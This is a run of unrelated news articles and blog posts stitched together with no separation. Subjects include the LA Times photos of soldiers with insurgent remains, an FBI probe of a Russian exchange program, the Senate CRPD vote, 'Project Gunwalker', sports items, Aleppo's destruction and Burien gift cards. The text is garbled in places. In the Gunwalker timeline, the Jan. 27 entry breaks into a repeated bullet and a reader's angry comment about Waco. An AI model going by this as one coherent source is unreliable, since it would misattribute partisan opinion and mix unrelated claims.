In one of the pictures a paratrooper posed next to an unofficial patch placed beside a body that read "Zombie Hunter", while in another soldiers posed with Afghan police holding the severed legs of an insurgent bomber. Two soldiers in another frame held a dead insurgent's hand with the middle finger raised. The LA Times said the 82nd Airborne Division soldiers had been at a police station in Afghanistan's Zabol province in February 2010, and revisited several months later. The pictures were taken on both occasions. U.S. Defense Secretary Leon Panetta said in a statement released by departmental spokesman George Little that publication of the pictures could prompt further attacks against security forces ahead. "The danger is that this material could be used by the enemy to incite violence against U.S. and Afghan service members in Afghanistan," Panetta said. "U.S. forces in the country are taking security measures to guard against it." The U.S. Ambassador in Afghanistan Ryan Crocker also condemned the photographs, calling the actions of the soldiers "morally repugnant" and saying they "dishonor the sacrifices of hundreds of thousands of U.S. soldiers and civilians who have served with distinction in Afghanistan". The Times defended the distribution of the photos, which U.S. military officials asked the Times not to publish. "After careful consideration, we decided that publishing a small but representative selection of the photos would fulfill our obligation to readers to report vigorously and impartially on all aspects of the American mission in Afghanistan," Times Editor Davan Maharaj said in the newspaper's article. The photos are likely to stir up more anti-Western sentiment in Afghanistan as NATO combat troops look to exit the country in 2014 and strengthen fragile security in the country. Such incidents have complicated U.S. efforts to negotiate a strategic partnership agreement to define its presence once most foreign combat troops pull out by the end of 2014.

While Arturo Vidal believes Roma has better players, he feels Juventus has a better team.
Juve and Roma are atop the Serie A table.
"Roma have great quality and fast players,” he told Tuttosport.
“We maybe have less quality, but we are a team. We exploit our opponents by being compact, passing the ball more and reacting under pressure.
"Juventus is under more pressure than the others because we have won the last three league titles. We are always facing the game of our lives, but I love it... the pressure motivates me.”
Vidal has been linked with a move away from Juve with Manchester United especially interested.
“I can only say that I am happy in Turin. I am happy, my wife and son love it here.
“My family's happiness is more important than money or anything else. At Juventus I am happy, it is my home. It's always tough to leave your home, right?”
Hello. You catch me at a strange time. I'm here in Sydney, an Australian city where the sun shines all winter and the birdsong is the screech of banshees. I've decided to give up sleep, as it has abandoned me; I was never entirely sure of the point of it anyway.
The purpose of this post is to solicit submissions – well, votive offerings, really – to a shrine that I'm constructing. I'm here in this place to build a Panic Office. It's going to be in a place called Carriageworks and is facilitated by an organisation named Semi-Permanent, both of whom appear sufficiently confident and/or deluded that letting me do what I want is in some way a good idea. And in the very centre of this Panic Office will be a Shrine of Bear, a room devoted to the pointy-toothed bear that has become either my trademark or the cartoon albatross that circles my derelict ship as it idles endlessly in the Doldrums.
Anyway, it's your turn now. I want you to send me photographs of your drawings of The Bear. I want photographs of your Bear cakes, your Bear teddy bears, Bear ear-rings, Bear suits, Bear sushi, Bear tattoos – anything Bear – and I'll print it out and attach it to the interior of the Shrine of Bear.
Here's the address: stanleydonwood@semipermanent.com
If you'd like an idea of how I want the Shrine to look, try typing ‘stalker shrine' into a reputable search engine. You'll see.
Ok, right, I'm off to cry about the political situation in my home country.
It was recently reported that talks of a Flash/Green Arrow/Supergirl crossover could very well happen sooner rather than later. According to this Screen Rant article, http://screenrant.com/flash-supergirl-arrow-crossover-this-season/, the producers, most notably Greg Berlanti, said that there have been informal talks of a crossover. However, nothing has been made official. But, the wheels have certainly begun to turn.
It is no longer a question of “if” but “when”. If you've listened to the Scene N Nerd podcast you've heard me say, since Supergirl debuted on CBS, that a crossover was inevitable. The showrunners can throw up all the smoke screens they want. But, what you must remember is how they've always said that there are no plans “right now”. I mean, come on, do you really think the showrunners are going to spill their guts in an interview or on a podcast. No, no they aren't. But, I'm glad they are playing this game with us. Otherwise, this wouldn't be fun to speculate about. We will always be teased and they will always deny. Do I need to remind everyone how Jason Momoa consistently shot down rumors he was Aquaman or Paul Rudd denied that he was Ant-Man. I think you catch my drift.
The same team running Arrow and The Flash are behind Supergirl. If you had to bridge the shows with one character bringing everyone together then it's Barry Allen. The Flash and Supergirl are very similar in tone and we've already seen Flash and Green Arrow, successfully, team up twice. So, watching Barry break the ice between Kara and Oliver makes perfect sense and would be fun to watch. Honestly, that's the easy part.
Can you imagine watching a conversation between Kara, Barry and Oliver? Whether it'd be in the “Arrow Cave” (thanks Cisco), S.T.A.R. Labs or at CatCo I think we'd all be fangirling or fanboying like crazy and don't even get me started if The Flash, Green Arrow and Supergirl are all suited up and get a little help from the Martian Manhunter. Yup, call it in because I'd be dead if that happened. So much Justice League, SO MUCH! Well, kind of. Okay, I digress.
I don't really see a problem with all these shows coexisting. Quite honestly, the hardest part might be just timing for the people working on and in these shows. Everyone has their hands full with the second half of these seasons just about to get going. Not to mention Legends of Tomorrow is about to kickoff and will demand even more attention. But, as the article also stated, there's also a possibility that Supergirl could be hinted at in ‘Legends' as well. If there's any mention of Kara in Legends of Tomorrow then all bets are off.
Another thing to think about is the who the villain could be that would bring these three heroes together. Who's powerful enough and who will DC/WB allow? You'd also have to level the playing field somehow, for obvious reasons. But, I also think the showrunners could easily take a queue from what transpires in ‘Batman v Superman'. That blueprint will be front and center come March.
Bottom Line: My thinking of an “epic crossover” is this, with such little time left and so little time to shoot we'll probably get more of a hint at Supergirl in one of the three CW shows. My money would be on ‘Legends'. Time travel will play a big role in this show, let's also not forget about the “Multiverse”, and people will likely be assuming a reveal could come on The Flash. It'd be a perfect “redirect” so we're all shocked when we hear a mention of Kara on ‘Legends'. I also believe that the connection of Supergirl and ‘Legends' will make the shared universe even more real. I think we won't get a full on epic crossover till next season. Instead of a “Flarrow” crossover we'll get a “SuFlarrow” crossover, sometime before the winter hiatus. I don't think they'll have us waiting long to see these three team up and I have no doubt it'll be glorious.
What are your thoughts? Do you want a crossover now? Do you want them to wait? Leave a comment below and let us know what you think.

The FBI is investigating whether the U.S.-based director of a Russian government-run cultural exchange program was clandestinely recruiting Americans as possible intelligence assets, according to law enforcement officials.
FBI agents have been interviewing Americans who participated in the Rossotrudnichestvo exchange program run by Yury Zaytsev, who also heads the Russian Center for Science and Culture in Washington. For the past 12 years, the program has paid for about 130 Americans to visit Russia.
FBI spokeswoman Amy Thoreson declined to comment on whether there was an investigation or to discuss the bureau's role. A woman who answered the phone at the cultural center said that neither Zaytsev nor the center would comment.
“We know that the boys and girls are speaking,” said the woman, referring to the young Americans who participated in the program and have been interviewed by the FBI. “There are many. But we shall not put out a comment.”
“We are clean and transparent, friendly and true,” said the woman, who did not give her name or title.
The center, at Phelps Place in the Kalorama neighborhood of northwest Washington, offers language lessons and cultural programs, according to its Web site.
A spokesman for the Russian Embassy in Washington denied that the cultural center was involved in the recruitment of spies.
“All such ‘scaring information' very much resembles Cold War era,” the spokesman, Yevgeniy Khorishko, said in an e-mail. He added that such allegations were being leveled only to “distort and to blacken activities of the Russian Cultural Center.”
The FBI investigation of Zaytsev was first reported by Mother Jones magazine on its Web site.
Law enforcement officials said the FBI is investigating whether Zaytsev and Rossotrudnichestvo have used trips to Russia to recruit Americans. Rossotrudnichestvo paid for all their expenses, including meals, travel, visa fees and lodging. Most of the trips involved about 25 participants, who sometimes stayed in luxury hotels and met with Russian government officials.
Zaytsev did not go on the exchange trips, said one law enforcement official, but he created files on some of the participants, allegedly to cultivate them as future intelligence assets. Law enforcement officials would not comment on whether the FBI has any evidence that Zaytsev was successful in recruiting any assets.
As part of their probe, FBI special agents are trying to interview the Americans who participated in the program, including graduate students, business executives, political aides and nonprofit workers. Rossotrudnichestvo also has cultural exchanges for young people in Europe, Africa, Latin America and Asia.
Richard Portwood, the executive director of the Center for American-­Russian Engagement of Emerging Leaders and a participant in the cultural exchange program, said he was interviewed by the FBI this month and was told that Zaytsev was a foreign intelligence officer.
“These revelations came as a total surprise,” Portwood said in a statement. “My sincere hope is that Mr. Zaytsev's alleged activities do not prevent U.S.-Russia cultural exchanges in the future.”
Portwood, 27, a graduate student at Georgetown University's School of Foreign Service, said in a telephone interview that he took two trips to Russia through the exchange program, each lasting a little more than a week, in December 2011 and in June 2012. He said the FBI wanted to know what he and others traveling with him did on the trips, whom they met with and whether they saw anything suspicious. Portwood said the trips did not raise any suspicions. But he added: “Cold War spy games have existed for decades between the U.S. and Russia. We're not naive to that history.”
Zaytsev, who is on a State Department list of foreign mission staff, has diplomatic immunity, according to an administration official. The United States could revoke his immunity, which would force him to return to Russia, a law enforcement official said.

Yesterday the Senate, by a vote of 61-38, failed to ratify the United Nations Convention on the Rights of Persons with Disabilities (CRPD), which would have done nothing to help persons with disabilities, but would have diminished U.S. sovereignty by giving the United Nations unprecedented authority over American businesses.
Treaties require 2/3 of the Senators present to vote for ratification. Since 99 Senators were present for the vote, the treaty needed 66 yes votes but received only 61.
Take Action
If your Senator is one of the 38 listed below who voted against the Treaty, please take a moment to call and thank him or her.
This Treaty is likely to come to the Senate floor again in the future, so please urge your Senator to stand strong and continue to oppose it!
NAYs - 38
A few days ago, members of Occupy San Diego cleverly mic-checked Mayor Jerry Sanders during his State of the City address.
Now mic-checking, while intentionally disruptive, is an completely peaceful tactic that has been employed in a wide-variety of settings during the Occupy Wall Street movement.
The CEO of Wells Fargo, representatives of JP Morgan Chase, Newt Gingrich, and even President Obama have been targets of this practice. But not even President Obama responded with as much aggression and ignorance as the San Diego police officers in attendance (with full blessing of the Mayor).
Not content to simply escort the OWS protesters out of the venue, at least three were arrested and charged with felony conspiracy for their actions.
Watch the footage of the action below, then read the legal definition of felony conspiracy here, and tell me if you think the punishment fits the crime.

Hebrew gravestones desecrated in the Jewish cemetery of Weyhers, August 28, 2005 (illustrative)
A Jewish cemetery in the northern German city of Oldenburg was desecrated.
Swastikas were daubed on the entrance columns, a wall and two cars parked near the cemetery over the weekend, the Oldenburger Online newspaper reported. Police are investigating.
Over the past few years, the cemetery has been targeted by right-wing extremists, one of whom was sentenced to two years' probation for throwing paintballs on the gravestones.

As you might have heard, last week Google officially became Alphabet, and Alphabet is now the parent company of Google. We know, it does sound a bit confusing. Basically Google, which was the parent company for their products and services and divisions, became known as Alphabet.
However within Alphabet, there exists Google which will handle some of its products and services like Android, Gmail, Google Maps, and so on. That being said Alphabet needs its own website and right now it is basically abc.xyz. However according to a Google spokesman, “We realized we missed a few letters in abc.xyz, so we're just being thorough.”
And by thorough, Google has basically bought the entire alphabet as its domain name. This means that Abcdefghijklmnopqrstuvwxyz.com is now officially owned by Google. Unfortunately surfing on over to the URL leads to nothing and we're not sure if Google or Alphabet has any plans for it.
However we can only assume that even if they don't, it is a good safety precaution against domain name squatters who might try to hold it ransom and convince Google/Alphabet to buy it off them, or it could lead to confusion. Either way we will be watching that space very closely and hopefully we will see something soon.

The following statement was released today by Rudy Fichtenbaum, AAUP president, and Hank Reichman, AAUP first vice-president and chair of Committee On Academic Freedom.
Shortly after the 2016 election, the AAUP warned that we could be facing the greatest threat to academic freedom since the McCarthy period. It now appears that such a warning was not misplaced. Extremists in the administration, Congress, and several state houses have created an atmosphere in which "alternative facts" reign supreme, and which encourages the introduction of legislation that threatens the core principles of our democracy.
The latest examples of extreme legislation come from Iowa and North Carolina. In Iowa, a bill has been introduced that would prohibit the hiring of a professor or instructor at a public university or college if his or her most recent party affiliation would “cause the percentage of the faculty belonging to one political party to exceed by 10 percent” the percentage of the faculty belonging to the other dominant party.
In North Carolina, legislation (since tabled) was introduced that would require tenure-track and tenured faculty members to “reflect the ideological balance of the citizens of the state,” so that no campus “shall have a faculty ideological balance of greater or less than 2 percent of the ideological balance” of North Carolinians.
Many may rightly believe that initiatives like these cannot pass and that if passed they would be overturned immediately by the courts. However, the introduction of such legislation has a chilling effect. Moreover, implicit in these proposals is the demand that prospective and current faculty members disclose their political affiliations and personal political views as a condition of employment, which is precisely what happened during the McCarthy period.
The AAUP opposes in the strongest terms any legislation that would create an ideological or political litmus test as a qualification for employment as a faculty member at a university or college. Our commitment to academic freedom is rooted in a vision of democracy that thrives on dissent, critical inquiry, free speech, and free research. We will continue to join with other organizations to resist threats to academic freedom, legislative intrusions into higher education, and harassment of faculty.
Minister of Defence Marise Payne with NATO Secretary General Jens Stoltenberg. Credit:NIDS/NATO Multimedia Library "That clearly will involve acceleration," Senator Payne said. Asked if Australia would be open to the US requiring a greater commitment from Australia, Senator Payne said "we would consider any request on its merits". Senator Payne and Mr Mattis were in Brussels for a meeting of the international Counter-IS coalition of countries involved in the fight against the terror group. The pair had a one-on-one meeting afterwards. Senator Payne said the effort to retake Mosul, for example, "has been a hard process by some very hardworking members of the Iraqi security forces, of their counterterrorism service, of their supporters in the international coalition, those who are engaged and advise and assist such as Australia.
US secretary for defence James Mattis and Defence Minister Marise Payne. Credit:US DoD "That will continue but the pace will pick up and we will see in due course - about 15 days - the final form that takes after it is presented to the president." Earlier, Mr Mattis was asked directly if additional troops would be sent to Syria. He did not directly answer the question but made it clear it was being considered as an option. "I don't know," he said "I think you'd have to ask that question of some others in order to get a full answer… right now I first want to talk to other allies and we'll decide where we're going. "Once I get current [information] and once I get allies' assumptions and appreciations for the situation we will carve out where we want to go."
Senator Payne said she would not second guess those who made operational decisions on what an acceleration of action against IS would look like. But there was a "clear mission in front of us" to complete the taking of Mosul in Iraq, she said. Then there would be work to stabilise the communities, villages and cities reclaimed from ISIS. "Then ahead of us we have to address what will be required in Raqqa [in Syria]," she said. "We will hear from the chief of the ADF and our military advisors as to how they think that plays out for us and make decisions in accord with that." NATO commitment Mr Mattis caused a stir in Brussels on Wednesday evening by threatening to "moderate" US support for NATO if other members didn't kick in more money.
He told NATO ministers that many member countries needed to significantly increase their defence spending, to the 2 per cent of GDP level agreed in 2014 but so far only implemented by a handful of members. "If your nations do not want to see America moderate its commitment to this Alliance, each of your capitals needs to show support for our common defence," Mr Mattis said. According to news reports it left some NATO officials "scared and confused" about whether the US was still fully committed to the alliance. European diplomats said if taken literally it meant American guarantees for security in Europe were not 100 per cent any more. On Thursday, Mr Mattis refused to clarify what he meant by his threat to "moderate" US support for NATO.
He said this outcome was something "that I do not anticipate ever seeing". "Sometimes you say the things you don't want to have happened, so that you head them off," he said He did say, however, that American commitment to the mutual defence pact among NATO members "remains rock solid". Senator Payne said that having met Mr Mattis she did not think he was bluffing. "I doubt that secretary Mattis bluffs," she said. "I think the observations he made were very timely… these are important undertakings and those who are sitting around the table need to step up to the plate."
However she said the comments did not compromise Europe's security, as Mr Mattis had made clear the US's strong commitment to NATO. She had received "quite a different message" from Mr Mattis about Australia, she said. Loading The US was aware of Australia's commitment to increase defence spending to 2 per cent of GDP by 2020/21, she said. "This issue is clearly important to the US."
The shirt was considered “offensive” and against “family values.”
In the year 1995, when Hillary Clinton was First Lady in the White House, a now-viral T-shirt emblazoned with the words “Someday a woman will be PRESIDENT!” was pulled from Walmart's shelves. Consider the word PRESIDENT, insistently presented in all caps, and then consider this: Walmart removed the shirt from stores (about 20 years before Clinton would become the first woman U.S. presidential nominee of a major party) because it was “offensive” and went against Walmart's “family values.”
The T-shirt, which features feminist-in-training Margaret from Hank Ketcham's “Dennis the Menace” comic strip, went viral on Tuesday night after a Rutgers University professor shared an old Associated Press story on Twitter. This morning, he shared a photo of the shirt:
Here is what the offending shirt looked like: pic.twitter.com/mdiIi7bEQD — Nick Kapur (@nick_kapur) July 27, 2016
The T-shirt's designer, then-70-year-old Florida psychologist Ann Ruben, explained the blowback in 1995 with a response that may sound familiar: “Promoting females as leaders is still a very threatening concept in this country,” she said.
She went to the media after Walmart pulled the shirt. “I was never aware that promoting women as leaders flew in the face of family values,” she told People. “It didn't make any sense.”
As noted by Jezebel, the same 1995 People article reported that Walmart was inundated with “a storm of complaints” after pulling the shirt — so severe that it ordered 30,000 of the shirts to sell nationwide.
Walmart spokesperson Danit Marquardt emailed the Cut to comment: “Wow, it still pains us that we made this mistake 20 years ago. We're proud of the fact that our country – and our company – has made so much progress in advancing women in the workplace, and in society.”
Nothing is certain, expect death and lease agreements. Toyota is currently taking legal action against Sally Shafton, an 81-year-old widow, for fees associated with her husband's "early cancellation" of his lease, The Los Angeles Times reported . The reason for his early cancellation? Death at 83 from prostate cancer.Bob Shafton leased a Prius from a Manhattan Beach, Calif. Toyota dealership nine months before he died. Sally told the L.A. Times that a salesman assured Bob if he died it would interrupt the lease. After he passed in December, Sally contacted Toyota Financial Services to explain the situation and inform them that they could come and pick up the car. A few weeks later, a Toyota employee came out to her home and took it back.Sally thought the lease was over and done with until she received a bill from Toyota seeking $2,352.72 from Bob's estate. Bob owed three years worth of lease payments, or $27,470, on the Prius when he died. After taking it back, Toyota put the barely used car up for auction , where it sold for $23,800. Bob's estate was expected and legally bound to pay the difference, plus a $225 charge for retrieval and $83 for "reconditioning" the car."Recondition?" Shafton exclaimed to the Times. "It was a new car that we'd had for only nine months. And Bob was so ill he rarely drove it."Sally was contacted by the law firm Weltman, Weinberg & Reis on behalf of Toyota. While Sally herself is not on the hook, as she wasn't on the lease, Toyota seems determined to get their $2,352.52 from her dead husband's estate, which is everything Sally and Bob had built over 60 years."The estate is me," she told the Times. "Everything in the estate has gone to me."

A journalist's guide to 'Project Gunwalker'
Gun Rights Examiner ^ | 2 February, 2011 | David Codrea
Posted on by marktwain
The following is a summary and timeline of articles appearing on the Sipsey Street Irregulars blog and Gun Rights Examiner, reflecting original reporting on the developing "Project Gunwalker" story by Mike Vanderboegh and myself. That's the purposely ironic name I assigned it, a parody of the Bureau of Alcohol Tobacco, Firearms and Explosive's "Project Gunrunner," and it refers to allegations by whistleblowing ATF insiders that:
* ATF management was allowing potentially hundreds of semiautomatic firearms to be walked across the Mexican border in order to pad statistics used to further budget and power objectives.
* Mexican authorities were kept in the dark, and protests that they should be informed were overridden, first by the Phoenix ATF office, and ultimately by higher-ups in Washington, DC.
* A gun used in this operation was involved in a December 2010 incident in which a Border Patrol agent was killed.
The original allegations were posted on CleanUpATF.org. Vanderboegh and I, who have a history going back years of documenting allegations posted there, and pressing for congressional hearings to investigate the claims, were both contacted independently by various ATF insiders claiming to have corroborating information and documentation. Mike vetted his sources and I used my contacts to help validate that my informant was who he represented himself to be. Mike and I did what we could throughout our separate and coordinated investigations to test and corroborate what was being told. We also had a small circle of behind-the-scenes consultants, including firearms designer Len Savage, and a few other knowledgeable advisors, all with contacts and informed insights of their own, and all of whom have earned our trust over the years.
Our primary goal was to help arrange for protection for our sources, and quickly, as retaliation was feared. Because the allegations involved higher ups within the Justice Department, the added protection afforded by separation of powers was sought. Through various contacts and machinations that are documented in the following timeline, the whistleblowers came under the protective umbrella of Sen. Charles Grassley, a senior member of the Committee of the Judiciary.
Our secondary goal was to push this story outside our limited spheres of influence and into the "mainstream press," so that it would be problematic to ignore or bury things. Again, making this happen has been an ongoing struggle, but we've seen the first cracks in the dam. The following timeline will bring journalists just getting involved with this story up to speed by walking them though it, from its genesis to where we are today as major media outlets finally begin to take notice and get involved.
By way of a FAQ, two seem to be recurrent:
Will you have your sources contact us?
and
Will you provide us with copies of documentation?
The answer to both is "No." The reason is one of protection. You will need to observe official proceedings and develop/consult sources of your own.
Here's what's happened so far, at least what I can publicly disclose:

Jan. 26:
* Hans von Spakovsky asks "Is the fix in at Justice? Appointing Robin Ashton to oversee ethical standards is like choosing a fox to guard the henhouse."
* More on the Project Gunrunner dog and pony show in Phoenix.
Jan. 27:

* ATF management was allowing potentially hundreds of semiautomatic firearms to be walked across the Mexican border in order to pad statistics used to further budget and power objectives. The WACO mindset. Got a few agents killed and over 80 men women and children, citizens generally of the USA, incinerated for their belief, and for being in the wrong place at the right time. I watched stunned that our government could do such a thing, and that the “people” would stand for it. So much for stunned on both counts. Then the court system further dumped on the few survivors. A travesty. Are we any different today? The government is X years deeper into itself, than it was at WACO, and now we are watching WACO on a global basis.

Donald Trump and Mike Pence recorded phone messages endorsing Greg Gianforte for Congress in Montana, where robocalls are illegal. Their contents are especially eerie in light of Gianforte's assault on a reporter the night before the election.
Montana's Republican congressional candidate, Greg Gianforte, has been charged with assault.
On the night before Election Day, he “body slammed” a reporter who asked him to comment on the GOP health care repeal bill following the release of the CBO score revealing that it would leave 23 million people without health coverage.
Three local newspapers have rescinded their endorsements of Gianforte, and the audio recording of the assault has led every local newscast.
But endorsements from two other significant figures remain in place.
Donald Trump and Mike Pence recently recorded phone messages endorsing Greg Gianforte. In Trump's recording, he calls Gianforte “my friend,” “a wonderful guy,” and says “he knows how to win.”
It's worth remembering that Trump spent much of his campaign encouraging violence against those who criticized him.
Pence's message implores voters to cast their ballot for Gianforte because he and Trump “need him in Washington,” and with Gianforte's help, “We will make America great again.”
Trump and Pence should withdraw their endorsements.
Gianforte should withdraw from the race.
But none of that will happen. In Trump's (and Pence's) America, this kind of behavior is not only accepted, but apparently what makes us great.
Hulkenberg said he was “not really surprised” by McLaren's Friday pace in Montreal, when Jenson Button equalled the sixth-fastest time of Valtteri Bottas in his Williams.
“I have them in my calculations for the rest of the season to be honest,” said Hulkenberg.
“I knew that every weekend it seems like they pretty much bring something [new].
“It looks like that's working well for them at the moment.”
Perez admits surprise
Hulkenberg's teammate Sergio Perez appeared more shocked by the pace of Button, and believes the closeness of the packed midfield will make getting into Q3 a difficult task on Saturday.
“I'm surprised they are quick on this type of track, but they were also quick in Bahrain [Button was third quickest in FP2 in Bahrain], so we'll see where they are tomorrow,” said Perez.
“It's a lot tighter than I thought [in Canada]. I thought we were going to be more comfortably inside the top 10 so we really need a perfect qualifying tomorrow to make it into Q3.
“I'm a bit concerned because the balance of the car is more or less alright. Generally on Friday you feel that there is a lot to improve on the car, but today I think there are just a couple of tweaks we can do to improve it but not a lot.”
The historic city of Aleppo, one of the oldest continuously inhabited cities of the world, lies in ruins today. The civil war in Syria, which has been raging for nearly five years now, has ravaged the entire country, killed tens of thousands and displaced millions. The UNESCO World Heritage Site of Aleppo is one of the worst hits with destruction that can only be described as catastrophic.
Where once stood Byzantine churches, ancient mosques and crusader fortresses, are now heaps of rubble. The minaret of the Great Mosque of Aleppo no longer stands, the walls of the Citadel of Aleppo are now lodged with bullet and artillery holes. The famous covered market of Al-Madina was raged to the ground by fire. Aleppo has become the symbol of the devastation wrought on Syria and its population.
The following photos comparing Aleppo's various landmarks before and after the war started were published by the city-based Olympia Restaurant.
On its Facebook page, the Olympia Restaurant writes: “These 124 images show our beloved city, how it was, and how it is now after sabotage, destruction, looting and burning of the monuments, historical places, old houses, mosques, churches and the historical old markets (Souks) which are classified as Sites of World Heritage by UNESCO since 1986."

Image copyright AFP Image caption The original cartoons were published in Danish daily Jyllands-Posten in 2005
A Danish teaching association wants controversial cartoons of the Prophet Muhammad to be included in school textbooks, it's reported.
The Association of Religious Education Teachers wants the cartoons to be incorporated into teaching materials "sooner rather than later", the DR Nyheder website reports. Studying them would help explore the relation between religious, social and political issues, according to association's president, John Rydahl. "The 'Muhammad crisis' is an obvious issue in religious education, and it amazes me that there hasn't yet been a textbook with the drawings," he says. It currently isn't obligatory to teach children about the cartoons, but many schools choose to cover the topic during history and social studies classes, according to the Danish Education Ministry.
The proposal has some support among Danish politicians, with the right-wing Danish People's Party calling for the cartoons to be mandatory learning material in religious education classes. Both the Conservatives and centre-left Social Democrats say they don't want it to be obligatory, because teachers should be free to decide on their own materials. But a Conservative spokeswoman says it would be "quite natural" for schools to use the images.
The cartoons were first published in Denmark's Jyllands-Posten newspaper in 2005, and sparked violent protests in some Muslim countries. In February, a gunman opened fire on people attending a free-speech debate in a Copenhagen cafe, killing one person. Cartoonist Lars Vilks, who drew the original caricatures, said he believed he was the target of the attack.

Arrivabene: Fighting for the title I think it is too much
After being thoroughly trounced by Mercedes at the Spanish Grand Prix, mixed messages have emerged from the Ferrari camp with Sebastian Vettel declaring he is still in the title fight while team principal Maurizio Arrivabene doubts his team are championship contenders.
Speaking after Ferrari finished third and fifth in Spain, Arrivabene said, “To fight for the championship, I think it is too much. The gap to Mercedes is there and we need to analyze our data to understand the reasons.”
At the same time Vettel was not throwing in the towel, and said after the race in Barcelona, “I am in the fight. We are able to improve our car. We have some steps coming. We need to start turning things around very soon but we are pushing hard to beat them.”
Ferrari had some major updates for their car at Circuit de Catalunya, but the impact on closing the gap to Mercedes was not evident.
Arrivabene admitted, “The numbers tell us that the new solutions are good, the reality shows that they are not good enough. We did make a step forward, but it was supposed to be a jump. I am not blaming anyone in particular, I am taking my own responsibilities. We need to work harder.”
Vettel was more positive than his boss in his assessment of the situation, “I think we have done a step forward as a team. It doesn't really show here but I am quite confident we will be stepping up our game again in the next couple of races and I look forward to that.”
“If you take the average of the first five races you have the reality. Some tracks you are better than others. For some reason, we were not that competitive here even though we have improved the car.”
“I am not happy with the result in terms of the gap to the front but we can be happy with the points,” added the quadruple world champion.
His teammate Raikkonen had an out of sorts weekend and ultimately decided against using the new updates as he struggled to find the sweet spot. In the end he finished fifth in the race after qualifying seventh.
Vettel was asked if the latest updates to the SF15-T were a step forward, “It is a good question. If you look at the gap in the race, it was the biggest we had so far this season so the conclusion could be it is not good. But we are confident we are going in the right direction.”
“We have to find the reason for the gap. Either the track didn't suit us or the conditions really suited Mercedes, I think it is one of them and I am looking forward to being a bit closer to them again in Monaco,” concluded the quadruple F1 world champion.
Looking for a kickstarter to support this Holiday Season? Probably not, we're all watching our shekels this time of year. However, I think you will want to put a few of those shekels towards this Kickstarter. It's for a short science-fiction film called Hashtag.
Gigi Edgley is attached to star in the short. Edgley is well-known in many sci-fi circles for her amazing portrayal of the alien Chiana in the television series Farscape, (What? You haven't seen Farscape? Go remedy that right now!) Most recently, Edgely hosted Jim Henson's Creature Shop Challenge. (Sidenote – Henson's company is responsible for the AMAZING puppets that you see on Farscape).
Along with Gigi Edgley starring in this sci-fi short, Ben Alpi will direct with Jyotika Virmani producing however production will never start unless they raise the funds. They need $40,000 and have raised almost $16,000 so far. The campaign has 9 days left. If you can, donate to the campaign. Five dollars, ten dollars, whatever moves you. They got some nice perks for folks who donate from $5 and up.
Below is some basic info about the film. Visit the Hashtag Kickstarter page as well and make a donation! I've already done so. Let's see if we can get this thing made!!!
Hashtag is a science fiction short — a sleek, smart, and sexy view of a world where social media dominates every moment of our lives. Hashtag follows “X”, the ultimate social media maven, a charismatic woman attracting the attention of tens of millions of online followers. “X” has attained everything she's ever wanted. She's #famous, she's #watched, and one unpopular move could mean the #end. Hashtag is directed and co-written by Ben Alpi (Cowboy Creed, Silver Lining) who was inspired by a TED talk to write a story about our culture's obsession with speed. Ben approached veteran sci-fi writer, Kevin Rubio (Star Wars: The Clone Wars, Ben 10, Green Lantern: The Animated Series, TROOPS), to co-write the script and the present incarnation of the script was born. Hashtag is an original, imaginative and thought-provoking tale in the wicked tradition of The Twilight Zone. Through the medium of classic science fiction storytelling, our writers weave a disturbing story of our all-too-possible future as a social-media society obsessed with virtual information and celebrity.

Could this be a salvation for freelance journalists who are struggling to turn a penny? A planned start-up in the United States is about to offer top dollar to story-writers.
Former New York Times executive editor Jill Abramson is prepared to pay $100,000 to writers to produce stories longer than long magazine articles but shorter than books, reports Poynter.
There will be "one perfect whale of a story" each month, she told a symposium, and it will be available by subscription.
Abramson, who is setting up the site with Steven Brill (of CourtTV, American Lawyer and Journalism Online), says they are very close to reaching a funding deal with one investor.
"If you are offering the ability to deliver something that is qualitatively different, there are investors willing to jump into that space," she is quoted as saying.

Melbourne, Australia: Big Bash League (BBL) franchise Melbourne Renegades' chief executive Stuart Coventry has confirmed they will not re-sign swashbuckling West Indian opener Chris Gayle for next summer's tournament.
Gayle also faces possible censure from his English county club Somerset when he arrives in the UK following his latest controversial remarks to a female journalist in that country. He has since said the comments were made in jest to have a bit of fun.
At one point in the interview, Gayle told the journalist he has "a very, very big bat, the biggest in the wooooorld," adding: "You think you could lift it? You'd need two hands."
The Jamaican earlier courted controversy during his infamous "don't blush baby" interview with Australian reporter Mel McLaughlin during last season's BBL.
Gayle equalled the record for the fastest Twenty20 fifty in his final innings for the Renegades last summer, but otherwise was below par with 260 runs at an average of 32.50 in eight matches.
"We'll unveil our international signings soon and Chris isn't part of those plans," Coventry was quoted as saying by News Corp on Tuesday, reports Cricket Australia's website.
Gayle's banishment from the Big Bash comes as the West Indian launched a publicity drive for his forthcoming autobiography in which former cricketers Chris Rogers, Ian Chappell and Andrew Flintoff have earned the West Indian's scorn.
The trio were each critical of Gayle's comments to McLaughlin last summer and Gayle has hit back in his book.
Rogers told earlier in January that he was concerned about the influence the West Indian might have on youngsters when they played together at the Sydney Thunder. But Gayle hit back to claim Rogers was his partner in crime at the Sydney nightspots.
"Chris Rogers, how can you claim that when it was you and me at the bar most nights?" Gayle was quoted as saying by The Times, London, on Monday.
"I'm not a snitch, but I've heard from your own mouth what you've done. Next time you want to open your mouth, maybe chew on a carrot instead,” he added.
Gayle also said, "you would have to ban cricket itself" if the International Cricket Council (ICC) followed through on Chappell's requests to have him removed from the sport.
"Ian Chappell, a man who was once convicted of unlawful assault in the West Indies for punching a cricket official. Ian Chappell, how can you ban the Universe Boss? You'd have to ban cricket itself,” Gayle said.
Flintoff tweeted after the infamous "don't blush baby" remarks to say that Gayle had "made himself look a bit of a chop there" to draw Gayle's ire.
"This coming from a man who admitted he (Flintoff) took Viagra during a Test match. The only chop Freddie knows is when he used to bowl short to me and I would chop him past backward point for four,” Gayle said.
Gayle was forced to apologise the following morning for asking McLaughlin out for a drink on live TV. However, he still maintained the whole affair was nothing more than a joke.
Gayle is currently playing for Royal Challengers Bangalore in the Indan Premier League.

0 Burien plans to give out gift cards for the homeless
BURIEN, Wash. - The city of Burien is planning to increase a budget to give out $25 gift cards to Safeway as soon as possible.
"It's not an overall fix. Homelessness is bigger than Burien. It can't be," said Katie Trefry, spokesperson for the city of Burien.
The city already has a $1,500 budget for gift cards and bus passes for the homeless, but the council just voted to increase the budget for the gift cards and bus passes by $6,000.
"This is supplemental ... This is increasing a budget to one that we haven't had before, so we don't really know what that'll end up causing within the community," said Trefry.
The money comes from Burien's overall Supplemental Human Service Allocation of $55,000.
This includes money for more street outreach from Auburn Youth Resources within Burien city limits, laundry services, a mobile dental van, and money to benefit Transform Burien—a food pantry and meal service program.
